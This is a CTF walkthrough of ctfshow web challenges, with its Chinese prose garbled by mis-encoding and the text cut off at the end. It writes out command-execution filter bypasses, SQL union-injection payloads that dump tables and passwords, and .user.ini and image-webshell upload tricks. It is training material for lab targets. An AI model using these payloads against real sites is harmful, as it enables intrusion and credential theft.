<p>å½“ç„¶ï¼Œphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚<br>æ„é€ pocæ‰§è¡Œå‘½ä»¤</p>
<blockquote>
<p>?c&#x3D;.+&#x2F;???&#x2F;???[@-[]</p>
</blockquote>
<p>æ³¨ï¼šåé¢çš„[@-[]æ˜¯linuxä¸‹é¢çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯ã€‚<br><img src="https://img-blog.csdnimg.cn/6c9aefc34bb946dcb1acdc502ed23489.png" alt="55"></p>
<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>è¿™é‡Œçš„å­—æ¯å’Œæ•°å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œé¢˜ç›®è¯´ä¼ å…¥ä¸€ä¸ª36ï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/cbc6e031f9034562a1fac4c51868d50f.png" alt="57">é‚£åº”è¯¥æ€ä¹ˆä¼ å…¥ä¸€ä¸ª36å‘¢ï¼Ÿ<br>å› ä¸ºæ˜¯åœ¨shellç¯å¢ƒä¸‹çš„ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨linux shellçš„ä¸€äº›ç‰¹æ€§ï¼š</p>
<p><code>$(())</code>ä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0<br><code>$((~$(())))</code> å¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code>å†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1<br>å¦‚æœå¯¹å–åä¸äº†è§£å¯ä»¥ç™¾åº¦ä¸€ä¸‹ï¼Œè¿™é‡Œç»™ä¸ªå®¹æ˜“è®°å¾—å¼å­ï¼Œå¦‚æœå¯¹aæŒ‰ä½å–åï¼Œåˆ™å¾—åˆ°çš„ç»“æœä¸º-(a+1)ï¼Œä¹Ÿå°±æ˜¯å¯¹0å–åå¾—åˆ°-1<br>é‚£ä¹ˆæœ€ååªéœ€è¦37ä¸ª-1ç›¸åŠ å†å–åå³å¯ã€‚<br>å†™ä¸ªè„šæœ¬ç”Ÿæˆpayloadï¼š</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">data</span> = <span class="token string">"$((~$(("</span><span class="token operator">+</span><span class="token string">"$((~<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>)))"</span><span class="token operator">*</span>37+<span class="token string">"))))"</span>
print<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/1dfc1bd03f634f0a8ac2897860397df8.png" alt="57"><br>ä¼ å‚åæŸ¥çœ‹æºç ï¼š<br><img src="https://img-blog.csdnimg.cn/2229ad05e7d44402a9129cac3b7498bf.png" alt="57"></p>
<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><p>è¿™æ¬¡æ˜¯postä¼ å…¥ä¸€ä¸ªcï¼Œä¸å¦¨ç”¨èšå‰‘è¯•è¯•ï¼Ÿ</p>
<p><img src="https://img-blog.csdnimg.cn/d4deb1dd5ef34b2e8119e315fcb326aa.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/b95d371722ed4cff845d0949b4ec7129.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/9bdfc6036b5244c089d74c881fcdf78d.png" alt="58"></p>
<p><strong>æ–¹æ³•äºŒ</strong><br>postä¼ å‚ï¼š<br>ä¼ å…¥<code>c=passthru(&quot;ls&quot;);``c=system(&quot;ls&quot;);</code>ç­‰ï¼Œå‘ç°æˆ‘è¯•çš„ç³»ç»Ÿå‘½ä»¤éƒ½è¢«è¿‡æ»¤äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/8067867549014691beb5f8863079e2d3.png" alt="58"><br>è¿™é‡Œè¡¥å……ä¸€äº›è¯»å–æ–‡ä»¶çš„å‡½æ•°çš„ç”¨æ³•ï¼š</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">highlight_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
show_source<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>php_strip_whitespace<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
readfile<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> var_dump
fread<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
include<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> éphpä»£ç 
include_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> éphpä»£ç 
require<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> éphpä»£ç 
require_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> éphpä»£ç 
print_r<span class="token punctuation">(</span>fread<span class="token punctuation">(</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>fgets<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> è¯»å–ä¸€è¡Œ
fpassthru<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> ä»å½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOF
print_r<span class="token punctuation">(</span>fgetcsv<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>fgetss<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°
print_r<span class="token punctuation">(</span>fscanf<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>parse_ini_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> å¤±è´¥æ—¶è¿”å› false <span class="token punctuation">,</span> æˆåŠŸè¿”å›é…ç½®æ•°ç»„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆ‘ç”¨ä¸€ä¸‹<code>c=echo file_get_contents(&quot;flag.php&quot;);</code>ï¼Œå¾—åˆ°äº†flagã€‚</p>
<h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>åŒä¸Šé¢˜ï¼Œä½†è¿™é¢˜<code>file_get_contents</code>è¢«è¿‡æ»¤äº†ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹<code>c=show_source(&quot;flag.php&quot;);</code>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/4f4ed1c363c54412be30562549fda20b.png" alt="59"><br>ä¹Ÿå¯ä»¥ä½¿ç”¨include()æ–‡ä»¶åŒ…å«:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;POSTä¼ å…¥ï¼š
c&#x3D;echo include($_GET[1]);
&#x2F;&#x2F;urlè¿æ¥ï¼š
&#x2F;?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¹‹åbase64è§£å¯†å¾—åˆ°flagã€‚</p>
<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>åˆšæ‰“å¼€çœ‹åˆ°<br><img src="https://img-blog.csdnimg.cn/56fd117279cc402ab4083d3e022ec80a.png" alt="71"><br>postä¼ å»ä¸€ä¸ªè¯•è¯•ï¼Œ<code>c=include(&#39;flag.php&#39;);</code>ï¼Œç»“æœéƒ½è¢«é€šé…ç¬¦å é¢†äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/bd4e04e75e79476db81a728aa3dbd6e8.png" alt="71"><br>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå‚è€ƒwpä¹‹åå‘ç°å¤§å®¶çš„éƒ½æ˜¯ç»™å‡ºindex.phpã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
ä½ è¦ä¸Šå¤©å—ï¼Ÿ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™æ ·çœ‹çš„è¯[0-9][a-z]éƒ½è¢«è¿‡æ»¤äº†ã€‚æ€ªä¸å¾—</p>
<blockquote>
<p>$s &#x3D; ob_get_contents();&#x2F;&#x2F;å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ã€‚<br>ob_end_clean();&#x2F;&#x2F;ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹ã€‚</p>
</blockquote>
<p>å¯ä»¥ä¸è®©ä»–æ‰§è¡Œåé¢çš„å†…å®¹ï¼Œè¿™æ ·å°±ä¸ä¼šè¢«è¿‡æ»¤äº†ã€‚åˆ©ç”¨<code>exit();</code>ç›´æ¥åœæ­¢åé¢çš„ç¨‹åºã€‚ç„¶åæ‰§è¡Œ<code>c=include(&#39;/flag.txt&#39;);exit();</code>æ‹¿åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/689f068a3e7842b48af6b07256822c61.png" alt="71"></p>
<h4 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p><a href="https://blog.csdn.net/qq_33862778/article/details/80787510?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=6">phpä¸­obå‡½æ•°çš„ç”¨æ³•</a></p>
<h2 id="SQLæ³¨å…¥ç¯‡"><a href="#SQLæ³¨å…¥ç¯‡" class="headerlink" title="SQLæ³¨å…¥ç¯‡"></a>SQLæ³¨å…¥ç¯‡</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><blockquote>
<p><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ· $sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; </code></p>
</blockquote>
<p>è¿™é‡Œä¼šæŠŠè¾“å…¥çš„idä»¥getçš„å½¢å¼ç›´æ¥é€’äº¤åˆ°åå°å’ŒæŸ¥è¯¢è¯­å¥è¿›è¡Œç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥çš„è¿‡ç¨‹ï¼ŒåŒæ—¶æ ¹æ®è¿™ä¸ªé¢˜ç›®çš„æŸ¥è¯¢æ¡ä»¶ï¼Œå¯ä»¥çŒœæµ‹usernameä¸ºä¸ºflagçš„ç”¨æˆ·ä»–çš„ä¿¡æ¯å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ã€‚<br>ä½†æ˜¯ç½‘é¡µé‡Œæ‰€å±•ç¤ºçš„24ä¸ªç”¨æˆ·å¹¶æ²¡æœ‰æˆ‘ä»¬æ‰€éœ€è¦çš„flag<br>è¿™é‡Œä¸»è¦çš„æ€è·¯å°±æ˜¯ç”¨orè¿›è¡Œæˆªæ–­ï¼Œç„¶åoråé¢è·Ÿæˆ‘ä»¬æ‰€éœ€è¦æŸ¥è¯¢çš„è¯­å¥<br>â€˜æˆ‘ä»¬ä¼ å…¥çš„è¯­å¥â€™<br>é¦–å…ˆæˆ‘ä»¬ç»™å‰é¢ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ä¸€ä¸ªä¸å¯èƒ½è¾¾æˆçš„æ¡ä»¶å»æˆªæ–­å®ƒï¼Œå³-1â€™<br>ç„¶åç”¨oråŠ ä¸Šæˆ‘ä»¬æ‰€è¦æŸ¥è¯¢çš„ or username &#x3D; â€˜flagâ€™.æˆ‘ä»¬è¯­å¥å¤–é¢è¿˜æœ‰ä¸€ä¸ªå¼•å·ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸è¦æœ€åä¸€ä¸ªå¼•å·<br>æœ€åçš„è¯­å¥å°±æ˜¯è¿™æ · -1â€™ or username &#x3D; â€˜flag<br><strong>æ–¹æ³•äºŒ</strong><br>ç”¨order byåˆ¤æ–­å­—æ®µï¼Œç¡®è®¤å­—æ®µæ•°ä¸º3<br><img src="https://img-blog.csdnimg.cn/e5cf7a706ab9414b8b4efa485c2b3698.png" alt="171"><img src="https://img-blog.csdnimg.cn/561caf246f524743916e4c290284d839.png" alt="171"><br>æ¥ç€ç”¨è”åˆæ³¨å…¥çˆ†å‡ºå½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨å</p>
<pre><code>-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()--+
</code></pre>
<p>æ ¹æ®é¢˜ç›®ç»™çš„SQLè¯­å¥åˆ¤æ–­ï¼Œflagå°±åœ¨å­—æ®µpasswordé‡Œï¼Œä¸”æ—è¾¹å¯¹åº”çš„å­—æ®µusernameå€¼ä¸ºflagï¼Œæ•…æ„é€ payloadç›´æ¥æŸ¥çœ‹flag</p>
<pre><code>-1&#39; union select 1,2,password from ctfshow_user where username = &#39;flag&#39; --+
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/8d1fc8e46c754886bebd3bc063318f9f.png" alt="171"></p>
<h4 id="ç»¼ä¸Š"><a href="#ç»¼ä¸Š" class="headerlink" title="ç»¼ä¸Š"></a>ç»¼ä¸Š</h4><p>çˆ†å‡ºæœ‰å“ªäº›ä½ç½®å¯ä»¥è¿›è¡Œè¾“å‡ºæ•°æ®<br><code>1&#39; order by 3--+</code></p>
<p>æŸ¥çœ‹æ•°æ®åº“åå­—<br><code>1&#39; union select 1,2,database()--+</code></p>
<p>çˆ†ç ´è¡¨åï¼š<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p>
<p>çˆ†ç ´åˆ—åï¼š<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code></p>
<p>çˆ†ç ´æ•°æ®ï¼š<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></p>
<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹æ•°æ®åº“åå­—</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/4c72f7bb235a43aabfc05f68a47b99b8.png" alt="172"><br>çˆ†ç ´è¡¨åï¼š<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172"><br>å‡ºç°ä¸¤ä¸ªè¡¨åï¼Œæœ‰çŒ«è…»ï¼ç»§ç»­å¾€ä¸‹åš<br>çˆ†ç ´è¡¨ï¼ˆctfshow_userï¼‰çš„åˆ—åï¼š<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/c47f98754ada4e5f89973323c64eea9a.png" alt="172"></p>
<p>çˆ†ç ´æ•°æ®ï¼š<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/e652af16a26a46b989ac1a6a87572daa.png" alt="172">æˆ–åªæŸ¥æ‰¾å¯†ç <br><code>1&#39; union select 1,2,password FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/b06dc2683d1c4bbf85eb0e874886d09f.png" alt="172"><br>æˆ–ç²¾å‡†æŸ¥æ‰¾flagçš„å¯†ç <br><code>1&#39; union select 1,username,password FROM ctfshow_user where username =&#39;flag&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/483e7992aec84c5f8801785f651f3ff5.png" alt="172"><br>çœ‹æ¥flagåº”è¯¥åœ¨å¦ä¸€ä¸ªè¡¨ä¸­ã€‚<br><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172">ç¡®å®ï¼š<br><img src="https://img-blog.csdnimg.cn/2a990c58086647cc8f591556d9b90096.png" alt="172"></p>
<h2 id="æ–‡ä»¶ä¸Šä¼ ç¯‡"><a href="#æ–‡ä»¶ä¸Šä¼ ç¯‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç¯‡"></a>æ–‡ä»¶ä¸Šä¼ ç¯‡</h2><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>ä¸Šä¼ å›¾ç‰‡é©¬æŠ“åŒ…æ”¹åç¼€<br><img src="https://img-blog.csdnimg.cn/1e8ea89704a54df79708da76200c7d64.png" alt="1"><br>æ¢äº†php5ï¼Œphtmlèšå‰‘è¿ä¸ä¸Šï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯php5ï¼Œphtmlæ²¡æœ‰è¢«è§£ææˆphpæ–‡ä»¶æ‰§è¡Œã€‚è¯¦æƒ…è¯·å‚è€ƒ<a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397"> .htaccess å’Œ.user.ini é…ç½®æ–‡ä»¶å¦™ç”¨ </a><br>æ‰€ä»¥è¦ä¸Šä¼ ä¸€ä¸ª.user.inié…ç½®æ–‡ä»¶ï¼Œå› ä¸ºè¯¥ç½‘ç«™æ˜¯nginxxç³»ç»Ÿ</p>
<p>åŒæ ·ï¼Œä¸Šä¼ pngæ–‡ä»¶ï¼ŒburpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ä¿¡æ¯ï¼Œæ–‡ä»¶åä¿®æ”¹ä¸º.user.iniï¼Œå†…å®¹æ·»åŠ <strong>auto_prepend_file&#x3D;1.png</strong>ã€‚å†ä¸Šä¼ ä¸€ä¸ªåä¸º1.pngçš„å›¾ç‰‡é©¬å³å¯</p>
<p><img src="https://img-blog.csdnimg.cn/1e185a3845754cbc86e795bf433dbd5c.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/4d12a3b8aa684b9981b21fe50035dde1.png" alt="3"><br>æœ€åè®¿é—®**&#x2F;url&#x2F;upload&#x2F;index.php<strong>ï¼Œç”¨</strong>12&#x3D;system(â€˜cat &#x2F;var&#x2F;www&#x2F;html&#x2F;f*â€™);**è¾“å…¥å‘½ä»¤è·å–flagå°±å¥½</p>
<h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p><img src="https://img-blog.csdnimg.cn/774a6099bce54cc2b80d994fa6ab641e.png" alt="1"><br>å…ˆä¸Šä¼ æœ¨é©¬å›¾ç‰‡ï¼Œåœ¨ä¸Šä¼ .user.iniæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/772c7be1ba234b79876564de940ce075.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/f4c39dfc13344f92baaf74f1c1131fdb.png" alt="3"><br><img src="https://img-blog.csdnimg.cn/235addb3fca1469cb74c46fecab5ad69.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/aa4c2da456f34dd3989d31231b939a1a.png" alt="5"><br>å¾—åˆ°flagã€‚</p>
<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>ä¸Šä¼ æ™®é€šæ–‡ä»¶æ˜¯ä¸è¡Œäº†ï¼Œphpå¤§å†™ä¸ºPHPæ˜¾ç¤ºä¸Šä¼ æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/f2885b09f69d4050b9e4700968b9b50b.png" alt="1"></p>
<p><img src="https://img-blog.csdnimg.cn/5642e7dad85e49399077a6ae2e1aa9be.png" alt="1"></p>
<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>ä¸Šä¸€é¢˜çš„æ–¹æ³•ä¸èƒ½ç”¨äº†ï¼Œå¯èƒ½æ˜¯è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œé‡‡ç”¨äºŒåˆ†æ³•çœ‹çœ‹æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/ffa7b02671d74acfbb1625163c046b88.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/21b518e23e66443893f63357d6fede21.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/25f2dc51ac204ded8df334d61ac99fc9.png" alt="3"><br>çœ‹æ¥æ˜¯è¿‡æ»¤äº†**[]<strong>ï¼Œå¯ä»¥ç”¨</strong>{}**ä»£æ›¿<br><img src="https://img-blog.csdnimg.cn/49012703e34c48dfbc3df84e4bbe7105.png" alt="3"><br>å‰©ä¸‹æ­¥éª¤å’Œä¸Šé¢˜ä¸€æ ·ã€‚</p>
<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>åœ¨url&#x2F;uploadä¸­æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š<br>**function check($str){<br>           return !preg_match(â€˜&#x2F;php|{|[|;&#x2F;iâ€™, $str);<br>       }**<br>       å¯ä»¥å‘ç°**phpï¼Œ{ï¼Œ[ï¼Œ;**è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆä¸€å¥è¯æœ¨é©¬å¯ä»¥ç”¨**<?= system('cat ../*.ph*')?>**æ¥ä»£æ›¿ã€‚<br>       é¦–å…ˆä¼ å…¥**.user.iniæ–‡ä»¶**å†™å…¥**auto_append_file&#x3D;2.png**æ„æ€æŠŠåŒç›®å½•ä¸‹çš„2.pngæ–‡ä»¶å½“ä½œphpæ–‡ä»¶æ¥æ‰§è¡Œã€‚<br>       ä¹‹åè®¿é—®url&#x2F;upload&#x2F;æŸ¥çœ‹æºç ä¾¿å¯å¾—åˆ°flagã€‚<br>       <img src="https://img-blog.csdnimg.cn/51c1859b5aef47c6bf2af0bbfc945edd.png" alt="1"></p>
<h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>ç›¸æ¯”äºä¸Šé¢˜å¤šè¿‡æ»¤äº†logï¼Œä¸è¿‡æ²¡äº‹ï¼ŒæŒ‰ä¸Šé¢˜åšæ³•ä¹Ÿå¯ä»¥ã€‚ä¾æ—§å¾—åˆ°flagã€‚</p>
<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>å‘ç°systemä¸èƒ½ç”¨äº†ï¼Œå¦‚æœç”¨å…¶ä»–å‡½æ•°æ¥ä»£æ›¿systemçš„è¯ï¼Œè¿˜è¦ç”¨æ‹¬å·**()<strong>,å‘ç°</strong>ï¼ˆï¼‰**ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå› æ­¤åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œ</p>
<blockquote>
